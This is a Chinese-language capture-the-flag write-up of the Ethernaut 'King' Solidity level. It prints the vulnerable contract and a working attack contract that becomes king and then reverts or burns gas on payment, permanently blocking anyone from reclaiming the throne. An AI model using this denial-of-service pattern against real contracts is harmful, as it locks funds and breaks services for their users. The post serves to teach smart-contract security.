---
title: Ethernaut - King
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-22
---

这个游戏的Key！

题目：一个简单的游戏，谁发送更多的ether谁就变成新的king！在这样的活动中，被推翻的国王会得到新的奖励，在这个过程中赚一点以太币！就像庞氏骗局一样 xD。

<!--more-->

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

	// 初始owner和king，以及初始的prize
    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }
	
	// 可以收钱
    receive() external payable {
        require(msg.value >= prize || msg.sender == owner); // 如果发的钱更多，成为新的king！
        
        payable(king).transfer(msg.value); // king收到转过来的钱
        king = msg.sender; // 更新king和prize
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

当我提交评测的时候，他会回收king，也就是转入更多的钱把自己变回king？

我要做的并不是变成king，而是让他无法回收king。

！我想到个方法，如果能让我称王后，所有后续receive都无法执行都会revert就行。但是好像做不到）

查到了！

> transfer 有一个内置的安全机制，它将转账金额限制为 2300 gas。这个限制确保了接收方合约在执行转账时不会进行复杂的操作，防止某些合约被恶意攻击，或者耗尽大量 gas 导致重入攻击漏洞。



噢噢，就是transfer的接收方收到钱后，执行 receive 函数，不能消耗超过2300的gas。

所以我写一个复杂的合约，让他称王！别人都改不了了！



# Transfer的安全机制

transfer 有一个内置的安全机制，它将转账金额限制为 2300 gas。这个限制确保了接收方合约在执行转账时不会进行复杂的操作，防止某些合约被恶意攻击，或者耗尽大量 gas 导致重入攻击漏洞。





# 解题

我写了个函数：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {
    bool public flag;

    address payable public owner;

    constructor() {
        flag = false;
        owner = payable(msg.sender);
    }

    function withdraw() external payable {
        owner.transfer(getBalance());
    }

    receive() external payable {
        if (flag) {
            // 写一个会消耗大量gas的函数
            uint256 sum = 0;
            for (uint i = 0; i < 100000000; i++) {
                sum = sum + uint(i);
            }
        }
    }

    function setFlat(bool _flag) public {
        flag = _flag;
    }

    function beKing(address payable target) external payable {
        target.transfer(getBalance());
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

但是这个 beKing 有问题！2300gas其实是个非常小的数字，King合约的receive也超过了这个限制！所以不能使用Transfer，但是可以用 call 来代替 Transfer。

所以改成：

```solidity
function beKing(address payable target) external payable {
    (bool success, ) = target.call{value: address(this).balance}("");  // 使用 call 替代 transfer
    require(success, "Transfer failed");
}
```





# 总结

Transfer转账有很强的gas限制，通常只用来给一个普通账户转账。

可以用 call 进行超过限制的转账！

```solidity
(bool success, ) = target.call{value: address(this).balance}("");  // 使用 call 替代 transfer
require(success, "Transfer failed");
```



> Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.
>
> In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).



